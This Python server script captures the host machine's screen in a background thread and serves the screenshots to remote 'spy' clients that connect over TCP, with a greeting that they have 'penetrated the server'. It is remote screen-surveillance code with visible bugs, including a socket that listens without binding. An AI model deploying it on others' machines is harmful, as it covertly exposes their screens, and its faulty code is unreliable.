from spy_support import interaction, screen_capture
import socket
import threading
import os

IP = socket.gethostbyname(socket.gethostname())
PORT = 0
HEADER_LENGTH = 10
clients = {}
os.chdir("..")
screenshot_dir = os.path.join(os.getcwd(), "screenshot")


def handle_client(client_socket, hostname):
    while True:
        message = interaction.receive_message(client_socket, role="server")
        if message == interaction.CMD_DISCONNECT or not message:
            break
        elif message == interaction.CMD_REQUESTSCREENSHOTS:
            interaction.send_message(client_socket, os.listdir())
        elif message == interaction.CMD_VIEWIMAGE:
            image_name = interaction.receive_message(client_socket, role="server")
            if image_name in os.listdir():
                interaction.send_message(client_socket, True)
                with open(image_name, "rb") as f:
                    interaction.send_image(client_socket, f.read(interaction.IMG_HEADER))
                    interaction.send_image(client_socket, f.read(interaction.IMG_HEADER))
                    interaction.send_image(client_socket, f.read(interaction.IMG_HEADER))
                    interaction.send_image(client_socket, f.read(interaction.IMG_HEADER))
                    interaction.send_image(client_socket, f.read(interaction.IMG_HEADER))
            else:
                interaction.send_message(client_socket, False)
        elif message == interaction.CMD_CHAT:
            chat = interaction.receive_message(client_socket, role="server")
            print(f"[MESSAGE] {clients[client_socket]}: {chat}")

    client_socket.close()
    client_count = threading.activeCount() - 3
    print(f"[INFO] {hostname} has disconnected. "
          f"{client_count} {'spy' if client_count <= 1 else 'spies'} remaining.")

def start_server():
    # Initiating screenshot capture
    screen_capture.create_storage_folder(screenshot_dir)
    paparazzi = threading.Thread(target=screen_capture.start)
    paparazzi.start()

    # Acquiring IP address
    g_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    g_socket.connect(("8.8.8.8", 80))
    ip = g_socket.getsockname()[0]
    g_socket.close()

    # Setting sever socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.listen()
    print(f"[LISTENING] server is listening @ {ip}:{server_socket.getsockname()[1]}")

    # Main program
    while True:
        # Listen to new connections
        client_socket, client_address = server_socket.accept()
        hostname = interaction.receive_message(client_socket)
        clients[client_socket] = hostname

        # Threads client handler
        thread = threading.Thread(target=handle_client, args=(client_socket, hostname))
        thread.start()
        client_count = threading.activeCount() - 2
        print(f"[NEW CONNECTION] {hostname} has connected. "
              f"A total of {client_count} client{'s are' if client_count > 1 else ' is'} spying.")
        infiltrated_message = "[SPYING] You have penetrated the server."
        interaction.send_message(client_socket, infiltrated_message)


if __name__ == "__main__":
    start_server()